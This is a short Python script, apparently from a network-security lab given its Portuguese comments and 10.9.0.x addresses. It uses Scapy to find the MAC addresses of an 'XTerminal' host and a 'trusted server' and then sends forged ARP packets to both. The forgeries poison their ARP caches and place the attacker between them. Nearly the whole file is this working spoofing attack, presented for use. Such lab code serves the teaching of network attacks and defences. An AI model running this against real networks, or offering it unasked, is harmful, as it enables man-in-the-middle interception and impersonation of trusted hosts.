from scapy.all import *
from time import sleep
import subprocess

# Configurações de rede
attacker_ip = "10.9.0.1"
xterminal_ip = "10.9.0.5"
trusted_server_ip = "10.9.0.6"

def send_ping(ip):
    packet = IP(dst=ip)/ICMP()
    sendp(packet, iface="eth0")

def get_attacker_mac():
    command = f"ifconfig eth0 | grep 'ether' | awk '{{print $2}}'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def get_mac(ip):
    command = f"arp | grep {ip} | awk '{{print $3}}'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def arp_spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    packet = ARP(op=1, psrc=spoof_ip, hwsrc=attacker_mac, pdst=target_ip, hwdst=target_mac)
    sendp(packet, iface="eth0")

print("Obtendo endereços MAC")

attacker_mac = get_attacker_mac()

xterminal_mac = ""
trusted_server_mac = ""

while not xterminal_mac or not trusted_server_mac:
    send_ping(xterminal_ip)
    send_ping(trusted_server_ip)
    sleep(2)
    xterminal_mac = get_mac(xterminal_ip)
    trusted_server_mac = get_mac(trusted_server_ip)

print("Endereços MAC:")
print(f"Atacante: {attacker_mac}")
print(f"XTerminal: {xterminal_mac}")
print(f"Servidor Confiável: {trusted_server_mac}")

print("Enviando ARP Spoofing")
for _ in range(10):
    arp_spoof(xterminal_ip, xterminal_mac, trusted_server_ip, attacker_mac)
    arp_spoof(trusted_server_ip, trusted_server_mac, xterminal_ip, attacker_mac)
    sleep(0.1)
